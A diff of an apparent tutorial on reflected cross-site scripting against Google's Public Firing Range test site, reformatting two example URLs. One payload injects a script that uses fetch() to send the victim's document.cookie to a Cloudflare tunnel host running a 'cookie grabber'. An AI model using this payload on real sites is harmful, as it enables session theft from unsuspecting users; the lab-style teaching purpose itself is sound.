@@ -9,7 +9,7 @@ One way to exploit is to inject a code with a script that reads the cookie. The 
 Try this example to test a parameter in the body-part of a site:
 <pre>https://public-firing-range.appspot.com/reflected/parameter/body/400?q=PLACEHOLDER<script>alert("VULNERABLE");</script></pre>
 
-Try this with a running Flask cookie grabber and a cloudflare tunnel:
-https://public-firing-range.appspot.com/reflected/parameter/body?q=a<script>fetch('https://[IDENTIFIER].trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script>
+Try this with a running Flask cookie grabber and a cloudflare tunnel:<br>
+<pre>https://public-firing-range.appspot.com/reflected/parameter/body?q=a<script>fetch('https://[IDENTIFIER].trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script></pre>
 
 The cookie grabber adds the stolen cookies as soon as the victim opens the modified link and adds a timstamp. 
